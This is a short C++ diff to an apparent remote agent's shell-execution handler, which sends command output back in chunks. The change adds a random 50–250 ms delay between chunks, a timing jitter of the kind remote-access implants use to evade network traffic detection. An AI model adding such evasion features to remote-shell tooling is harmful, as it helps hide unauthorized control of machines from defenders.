@@ -2,6 +2,7 @@
 #include <iostream>
 #include <chrono>
 #include <thread>
+#include <random>
 #include <sstream>
 #include <algorithm>
 #include <ctime>
@@ -251,12 +252,19 @@ void Agent::handleShellExecution(Packet&& packet) {
         return;
     }
 
+    thread_local std::mt19937 jitter_rng(std::random_device{}());
+    std::uniform_int_distribution<int> jitter_dist(50, 250);
+
     do {
         const size_t end   = std::min(offset + chunk_size, total);
         const bool is_last = (end == total);
         const uint8_t status = is_last ? 1 : 0;
         send_chunk(status, output.substr(offset, end - offset));
         offset = end;
+        if (!is_last) {
+            std::this_thread::sleep_for(
+                std::chrono::milliseconds(jitter_dist(jitter_rng)));
+        }
     } while (offset < total);
 }
 
